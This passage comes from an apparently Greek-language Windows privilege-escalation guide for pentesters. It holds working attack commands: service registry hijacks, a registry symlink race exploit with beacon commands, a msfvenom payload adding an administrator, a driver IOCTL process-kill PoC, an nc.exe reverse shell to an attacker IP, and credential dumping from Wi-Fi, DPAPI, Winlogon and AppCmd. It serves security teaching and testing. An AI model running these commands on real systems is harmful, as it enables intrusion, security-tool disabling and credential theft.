for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε οποιοδήποτε μητρώο υπηρεσιών.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας πάνω σε ένα **μητρώο υπηρεσιών** κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί εάν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** κατέχουν δικαιώματα `FullControl`. Εάν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να αλλαχθεί.

Για να αλλάξετε το Path του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Ορισμένες δυνατότητες Accessibility των Windows δημιουργούν ανά-χρήστη κλειδιά **ATConfig** που στη συνέχεια αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένας registry **symbolic link race** μπορεί να ανακατευθύνει αυτήν την προνομιούχα εγγραφή σε **οποιοδήποτε μονοπάτι HKLM**, δίνοντας ένα αυθαίρετο HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες λειτουργίες προσβασιμότητας.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχονται από τον χρήστη.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τις μεταβάσεις logon/secure-desktop και είναι εγγράψιμο από τον χρήστη.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Τοποθετήστε την τιμή **HKCU ATConfig** που θέλετε να γραφτεί από **SYSTEM**.
2. Προκαλέστε την αντιγραφή στο secure-desktop (π.χ. **LockWorkstation**), που ξεκινά τη ροή του AT broker.
3. Κερδίστε τον αγώνα τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; όταν ενεργοποιηθεί το oplock, αντικαταστήστε το **HKLM Session ATConfig** κλειδί με έναν **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Το **SYSTEM** γράφει την από τον επιτιθέμενο επιλεγμένη τιμή στο ανακατευθυνόμενο μονοπάτι HKLM.

Μόλις έχετε αυθαίρετο HKLM value write, κάνετε pivot σε LPE αντικαθιστώντας τιμές ρύθμισης υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που ένας κανονικός χρήστης μπορεί να ξεκινήσει (π.χ., **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Note:** η δημόσια υλοποίηση του exploit κλειδώνει τον workstation ως μέρος του race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Μητρώο υπηρεσιών AppendData/AddSubdirectory δικαιώματα

Αν έχετε αυτό το δικαίωμα πάνω σε ένα μητρώο, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-μητρώα από αυτό**. Σε περίπτωση Windows services αυτό είναι **αρκετό για να εκτελέσετε αυθαίρετο κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Εάν η διαδρομή προς ένα εκτελέσιμο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα πριν από ένα κενό.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Καταγράψτε όλες τις διαδρομές υπηρεσιών που δεν είναι περικλεισμένες σε εισαγωγικά, εξαιρουμένων αυτών που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε χειροκίνητα να δημιουργήσετε ένα service binary με metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να καθορίσουν ενέργειες που θα εκτελεστούν αν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary είναι αντικαταστάσιμο, ενδέχεται να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες μπορείτε να βρείτε στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **permissions of the binaries** (ίσως να μπορείτε να αντικαταστήσετε κάποιο και να escalate privileges) και των **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο δυαδικό αρχείο που πρόκειται να εκτελεστεί από λογαριασμό Διαχειριστή (schedtasks).

Μια μέθοδος για να εντοπίσετε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Το Notepad++ autoloads οποιοδήποτε plugin DLL κάτω από τους υποφακέλους `plugins`. Αν υπάρχει εγγράψιμη portable/copy εγκατάσταση, η απόθεση ενός malicious plugin δίνει automatic code execution μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένου από `DllMain` και plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να overwrite κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό user.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Ψάξτε για πιθανές **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Αν ένας driver αποκαλύπτει ένα arbitrary kernel read/write primitive (συνηθισμένο σε poorly designed IOCTL handlers), μπορείτε να κλιμακώσετε τα προνόμια κλέβοντας ένα SYSTEM token απευθείας από τη μνήμη του kernel. Δείτε την τεχνική βήμα‑βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου η ευάλωτη κλήση ανοίγει ένα attacker-controlled Object Manager path, η σκόπιμη επιβράδυνση της αναζήτησης (χρησιμοποιώντας max-length components ή deep directory chains) μπορεί να επεκτείνει το παράθυρο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitive μνήμης καταστροφής των Registry hives

Σύγχρονες ευπάθειες στα hives επιτρέπουν να διαμορφώσετε deterministic layouts, να καταχραστείτε writable HKLM/HKU descendants, και να μετατρέψετε metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθετε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Κατάχρηση της έλλειψης FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Κάποιοι signed third‑party drivers δημιουργούν το device object τους με ένα ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να ορίσουν FILE_DEVICE_SECURE_OPEN στα DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν εφαρμόζεται όταν η συσκευή ανοίγει μέσω ενός path που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε unprivileged χρήστη να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Μόλις ένας χρήστης μπορεί να ανοίξει τη συσκευή, privileged IOCTLs που εκτίθενται από τον driver μπορούν να καταχραστούν για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή χειριστηρίων (handles) πλήρους πρόσβασης σε arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη raw disk ανάγνωση/εγγραφή (offline tampering, boot-time persistence tricks).
- Τερματισμός arbitrary processes, συμπεριλαμβανομένων Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω του kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Μέτρα μετριασμού για προγραμματιστές
- Πάντα ορίστε FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε device objects που προορίζονται να περιοριστούν από έναν DACL.
- Επικυρώστε το caller context για privileged operations. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασίας ή την επιστροφή handles.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για direct kernel privileges.

Ιδέες ανίχνευσης για αμυνόμενους
- Παρακολουθήστε user-mode opens σε ύποπτα device names (e.g., \\ .\\amsdk*) και συγκεκριμένες IOCTL sequences που υποδηλώνουν κατάχρηση.
- Εφαρμόστε τη vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατηρήστε δικές σας λίστες allow/deny.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με τον τρόπο κατάχρησης αυτού του ελέγχου:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Ελέγξτε για **restricted services** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερα[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το δυαδικό `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε χρήστη root, μπορείτε να ακούσετε σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσετε το `nc.exe` για να ακούσετε σε μια θύρα, θα ρωτήσει μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Διαχείριση διαπιστευτηρίων / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για servers, websites και άλλα προγράμματα με τα οποία **Windows** μπορεί να **συνδέει τους χρήστες αυτόματα**. Στην πρώτη ματιά, αυτό μπορεί να μοιάζει σαν οι χρήστες να μπορούν να αποθηκεύουν τα Facebook credentials, Twitter credentials, Gmail credentials κ.λπ., ώστε να συνδέονται αυτόματα μέσω των browsers. Αλλά δεν είναι έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια που το Windows μπορεί να χρησιμοποιήσει για την αυτόματη σύνδεση των χρηστών, που σημαίνει ότι οποιαδήποτε **Windows application που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (server ή website) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** & Windows Vault και να χρησιμοποιήσει τα παρεχόμενα διαπιστευτήρια αντί οι χρήστες να πληκτρολογούν συνεχώς όνομα χρήστη και κωδικό.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν πιστεύω ότι είναι δυνατόν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Έτσι, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το credential manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο storage vault.

Χρησιμοποιήστε το `cmdkey` για να απαριθμήσετε τα αποθηκευμένα διαπιστευτήρια στη μηχανή.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα credentials. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ή από [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος για να συνεισφέρει σημαντικά στην εντροπία.

**DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προέρχεται από τα μυστικά σύνδεσης του χρήστη**. Σε σενάρια που περιλαμβάνουν συστημική κρυπτογράφηση, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας του domain του συστήματος.

Κρυπτογραφημένα RSA κλειδιά χρήστη, με χρήση του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το DPAPI key, που βρίσκεται στην ίδια θέση με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, εμποδίζοντας την εμφάνιση του περιεχομένου του με την εντολή `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τις κατάλληλες παραμέτρους (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσετε.\
Μπορείτε να **extract many DPAPI** **masterkeys** from **memory** με το `sekurlsa::dpapi` module (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Διαπιστευτήρια

Τα **PowerShell credentials** χρησιμοποιούνται συχνά για εργασίες **scripting** και αυτοματισμού ως τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων με ευκολία. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **αποκρυπτογραφήσετε** ένα PowerShell διαπιστευτήριο από το αρχείο που το περιέχει, μπορείτε να κάνετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατες εντολές που εκτελέστηκαν
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε .rdg αρχεία**\
Μπορείτε να **εξάγετε πολλά DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Συχνά οι χρήστες χρησιμοποιούν την εφαρμογή StickyNotes σε Windows workstations για να **save passwords** και άλλες πληροφορίες, χωρίς να καταλαβαίνουν ότι πρόκειται για αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητάτε και να το εξετάζετε.

### AppCmd.exe

**Σημειώστε ότι για να recover passwords από AppCmd.exe πρέπει να είστε Administrator και να τρέχετε σε High Integrity level.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\  
Εάν αυτό το αρχείο υπάρχει, τότε είναι πιθανό ότι ορισμένα **credentials** έχουν ρυθμιστεί και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν `C:\Windows\CCM\SCClient.exe` υπάρχει .\
Οι εγκαταστάτες **εκτελούνται με SYSTEM privileges**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH κλειδιά κεντρικού υπολογιστή
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH κλειδιά στο μητρώο

Τα ιδιωτικά SSH κλειδιά μπορούν να αποθηκευτούν στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
